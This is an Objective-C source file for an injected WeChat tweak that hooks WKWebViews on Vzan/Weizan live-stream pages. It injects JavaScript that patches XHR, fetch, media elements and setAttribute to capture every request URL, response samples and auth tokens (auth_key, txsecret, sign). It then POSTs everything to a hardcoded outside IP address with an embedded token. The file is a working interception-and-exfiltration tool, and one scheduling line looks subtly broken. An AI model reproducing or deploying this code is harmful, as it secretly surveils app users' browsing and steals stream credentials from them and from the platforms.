// ALIWeChatWKSniffer_SafeGate.m
// 目标：仅在进入 Vzan/微赞直播页后，且文档 ready，再注入JS（避免过早注入导致的闪退）
// 机制：定时扫描现有 WKWebView -> 对其添加 KVO(URL/estimatedProgress) -> 命中目标域名且进度>=0.8 -> 再次确认 readyState -> 注入
// 收集：抓啥都上报；命中流地址（m3u8/flv/auth_key…）本地弹窗+复制

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kScanInterval   = 1.2;   // 扫描现有 WKWebView 的间隔
static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重
static const NSTimeInterval kInjectDelay    = 0.6;   // 达到条件后再延迟注入，进一步稳妥
static const BOOL kShowPopupOnInject        = YES;   // 注入时提示
static const BOOL kShowPopupOnHit           = YES;   // 命中流地址时弹窗+复制

// 目标域名（可增改）
static NSArray<NSString*> *TargetHosts(void) {
    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
}

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-WX] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 工具/状态

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

static inline void on_main(void(^blk)(void)){
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
            if (![s isKindOfClass:[UIWindowScene class]]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"pull."]||[s containsString:@"replay"]||[s containsString:@"live"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}

static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

static void handleRawEvent(NSDictionary *evt){
    NSString *js = jsonStringify(evt);
    if (js) postText(js);
    NSString *u = evt[@"url"];
    if (u && looksLikeStream(u) && !dedupe_skip(u)) {
        if (kShowPopupOnHit){
            UIPasteboard.generalPasteboard.string = u;
            NSString *from = evt[@"from"] ?: evt[@"type"] ?: @"inpage";
            popup(@"抓到URL", [NSString stringWithFormat:@"%@\n%@", from, u], u);
        }
    }
}

#pragma mark - JS（与上一版一致：抓啥都上报）

static NSString *inpageJS(void){
    return @
    "(function(){try{"
      "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);}else{console.log('[ALI_SNIF]',p);window.__ALI_SNIF_LAST__=p;}}catch(e){}}"
      "function looks(u){if(!u)return false;u=(u+'').toLowerCase();"
        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1) return true;"
        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1) return true;return false;}"
      "send('INJECT_OK',{});"
      "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
        "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
        "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
          "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
            "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
            "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
          "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
      "})();"
      "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
          "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
            "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
            "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
        "catch(e){return F.apply(this,arguments)}})();"
      "(function(){if(!('PerformanceObserver'in window) || window.__ali_perf__)return;window.__ali_perf__=true;"
        "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
        "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
      "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
        "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
        "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
          "if(n&&n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} }"
          "if(n&&n.querySelectorAll){var vs=n.querySelectorAll('video,audio');for(var j=0;j<vs.length;j++){var t2=vs[j].tagName.toLowerCase();report(vs[j],t2,'sub');vs[j].addEventListener&&vs[j].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}});});"
        "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
        "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
        "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};}"
      "})();"
      "console.log('[ALI_SNIF] injected (safe gate)');"
    "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
}

#pragma mark - Message handler

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
@end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary *)message.body);
}
@end

static ALIMessageHandler *g_handler;

#pragma mark - 仅在命中目标域名 & ready 时注入

static const void *kInjectedKey = &kInjectedKey;
static const void *kKVOKey      = &kKVOKey;

static BOOL hostMatches(NSURL *url){
    if (!url.host) return NO;
    NSString *h = url.host.lowercaseString;
    for (NSString *pat in TargetHosts()){
        if ([h hasSuffix:pat.lowercaseString]) return YES;
    }
    return NO;
}

static void try_inject_when_ready(WKWebView *wv){
    if (!wv) return;
    // 二次确认：进度/readyState
    double prog = wv.estimatedProgress;
    if (prog < 0.8) return;

    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
        if (err) return;
        NSString *rs = [val isKindOfClass:NSString.class] ? (NSString*)val : @"";
        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;

        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return;

        // 延迟一点再注入，进一步避免 race
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            // 再次检查
            NSURL *u = wv.URL;
            if (!hostMatches(u)) return;

            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

            if (!g_handler) g_handler = [ALIMessageHandler new];
            @try{ [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}

            NSString *js = inpageJS();
            [wv evaluateJavaScript:js completionHandler:nil];

            if (kShowPopupOnInject){
                popup(@"JS 注入成功", [NSString stringWithFormat:@"域名：%@\n页面已就绪，开始采集", u.host ?: @"(null)"], nil);
            }

            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                  @"app": @"WeChat",
                                  @"page": (wv.URL.absoluteString ?: @""),
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
        });
    }];
}

#pragma mark - KVO 监听 URL/进度

@interface _ALIKVOBox : NSObject
@property (nonatomic, weak) WKWebView *wv;
@end
@implementation _ALIKVOBox
- (void)dealloc{
    @try{
        [self.wv removeObserver:self forKeyPath:@"URL"];
        [self.wv removeObserver:self forKeyPath:@"estimatedProgress"];
    }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
    WKWebView *wv = (WKWebView *)object;
    if (![wv isKindOfClass:WKWebView.class]) return;
    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
        NSURL *u = wv.URL;
        if (hostMatches(u)) {
            try_inject_when_ready(wv);
        }
    }
}
@end

static void attach_kvo_if_needed(WKWebView *wv){
    if (!wv) return;
    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
    if (box) return;
    box = [_ALIKVOBox new]; box.wv = wv;
    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    @try{
        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
    }@catch(__unused NSException *e){}
}

#pragma mark - 扫描现有 WKWebView（无 swizzle、无 documentStart）

static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]){
        WKWebView *wv = (WKWebView *)v;
        attach_kvo_if_needed(wv);
        if (hostMatches(wv.URL)) {
            try_inject_when_ready(wv);
        }
    }
    for (UIView *sub in v.subviews) walk_view(sub);
}

static void scan_loop(void){
    on_main(^{
        @try{
            for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w);
        }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DIS_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - 入口

__attribute__((constructor))
static void ALIWeChatWKSnifferSafeGateInit(void){
    if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.safe", DISPATCH_QUEUE_SERIAL);
    if (!g_seen)g_seen= [NSMutableDictionary dictionary];
    // 首次不做任何注入，只启动扫描与KVO，等进入目标域名且ready再注入
    scan_loop();
}
